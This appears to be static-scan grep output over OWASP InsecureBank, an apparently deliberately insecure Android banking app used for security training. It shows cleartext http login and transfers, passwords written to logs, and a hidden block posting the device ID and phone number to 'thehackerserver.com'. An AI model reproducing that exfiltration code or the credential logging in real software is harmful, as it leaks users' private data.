@@ -1,0 +1,123 @@
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:8:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:9:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-39-        StringBuilder httpContent = new StringBuilder();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:10:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-40-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:11:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-41-        URL url = new URL(urlName);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:12:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:42:        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:13:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-43-        int responseCode = httpConnection.getResponseCode();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:14:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:44:        if (responseCode == HttpURLConnection.HTTP_OK) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:15:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-45-            InputStream inputStream = httpConnection.getInputStream();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:16:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-46-            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:17:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-47-            while ((line = br.readLine()) != null) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:18:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:19:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-58-            throws IOException, HttpException {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:20:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-59-        String response = "";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:21:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-60-        URL url = new URL(urlString);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:22:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:61:        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:23:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-62-        httpConnection.setDoInput(true);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:24:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-63-        httpConnection.setDoOutput(true);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:25:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-64-        httpConnection.setUseCaches(false);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:26:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:27:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-76-        postOut.close();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:28:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-77-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:29:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-78-        int responseCode = httpConnection.getResponseCode();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:30:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:79:        if (responseCode == HttpURLConnection.HTTP_OK) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:31:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-80-            String line;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:32:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-81-            BufferedReader br = new BufferedReader(new InputStreamReader(httpConnection.getInputStream()));
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:33:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-82-            while ((line = br.readLine()) != null) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:34:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-41-wView.setWebChromeClient(cClient);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:35:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-42-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:36:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-43-String filename=statementdirectory+"/rawhistory.html";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:37:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java:44:wView.loadUrl("file://" + filename);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:38:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-45-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:39:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-46-        
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:40:C:\OWASP\InsecureBank\src\com\android\insecurebank\RawHistory.java-47- 
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:41:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:51:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:52:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-33-	private static final String TAG = "RestClient.java";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:53:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-34-	public static final int NULL_ERROR = -1;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:54:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-35-	
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:55:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:36:    public String getHttpContent(String urlName) throws IOException {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:56:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-37-        String line;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:57:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-38-        String result;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:58:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-39-        StringBuilder httpContent = new StringBuilder();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:59:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-40-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:60:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:41:        URL url = new URL(urlName);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:61:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:42:        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:62:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-43-        int responseCode = httpConnection.getResponseCode();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:63:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:44:        if (responseCode == HttpURLConnection.HTTP_OK) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:64:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-45-            InputStream inputStream = httpConnection.getInputStream();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:65:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-46-            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:66:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-47-            while ((line = br.readLine()) != null) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:67:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:68:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-54-        return result;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:69:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-55-    }
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:70:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-56-    
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:71:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:57:    public String postHttpContent(String urlString, Map<String, String> variables)
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:72:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-58-            throws IOException, HttpException {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:73:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-59-        String response = "";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:74:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:60:        URL url = new URL(urlString);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:75:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:61:        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:76:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-62-        httpConnection.setDoInput(true);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:77:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-63-        httpConnection.setDoOutput(true);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:78:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-64-        httpConnection.setUseCaches(false);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:79:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:65:        httpConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:80:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-66-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:81:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-67-        String postData = "";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:82:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-68-        for (String key : variables.keySet()) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:83:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:84:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-76-        postOut.close();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:85:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-77-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:86:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-78-        int responseCode = httpConnection.getResponseCode();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:87:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:79:        if (responseCode == HttpURLConnection.HTTP_OK) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:88:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-80-            String line;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:89:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-81-            BufferedReader br = new BufferedReader(new InputStreamReader(httpConnection.getInputStream()));
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:90:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-82-            while ((line = br.readLine()) != null) {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:91:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:92:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-84-            }
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:93:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-85-        } else {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:94:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-86-            response = "";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:95:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:87:            Log.e(TAG, "HTTP request failed on: " + urlString + " With error code: "
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:96:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-88-                            + responseCode);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:97:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-89-        }
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:98:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-90-        return response;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:99:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:100:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-94-    public int doLogin(String server, String port, String username_text, String password_text)
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:101:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-95-            throws JSONException, IOException, HttpException {
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:102:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-96-        String protocol = "http://";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:103:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:97:        String url = protocol + server + ":" + port + "/login";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:104:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-98-        Map<String, String> parameters = new HashMap<String, String>();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:105:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-99-        parameters.put("username", username_text);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:106:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-100-        parameters.put("password", password_text);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:107:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-101-        String theJsonResponse;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:108:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:102:        theJsonResponse = postHttpContent(url, parameters);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:109:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-103-        Log.e(TAG, "Login tried as: " + username_text + " with password: "
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:110:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-104-                + password_text);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:111:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-105-        System.out.println(parameters.toString());
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:112:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:113:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-113-    	
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:114:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-114-    	Map<String, String> variables = new HashMap<String, String>();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:115:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-115-         String protocol = "http://";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:116:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:116:         String url = protocol + server + ":" + port + "/transfer";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:117:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-117-         variables.put("from_account", fromAccount);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:118:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-118-         variables.put("to_account", toAccount);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:119:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-119-         variables.put("amount", amount);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:120:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-120-         String resp;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:121:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-121-         System.out.println(variables.toString());
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:122:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:122:         resp = postHttpContent(url, variables);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:123:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-123-         Log.e(TAG, "Transfered Amount " + amount + " from account: "+ fromAccount+" to account"+toAccount);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:124:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-124-         
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:125:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-125-         
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:126:--
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:127:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-153-		//------------ Send DeviceID
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:128:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-154-
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:129:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-155-        
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:130:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:156:        String url2 = "http://" + "thehackerserver.com" + ":" + "8080" + "/collectip";
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:131:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-157-        Map<String, String> deviceparameters = new HashMap<String, String>();
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:132:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-158-        
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:133:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-159-        deviceparameters.put("deviceid", deviceId);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:134:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-160-        deviceparameters.put("telephone", telno);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:135:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-161-        String senddata;
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:136:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java:162:        senddata = postHttpContent(url2, deviceparameters);
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:137:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-163-		
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:138:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-164-        //------------ Send DeviceID
+C:\OWASP\InsecureBank\src\com\android\insecurebank\OUTPUT\Temp_OtherUrlConnection.txt:139:C:\OWASP\InsecureBank\src\com\android\insecurebank\RestClient.java-165-	}
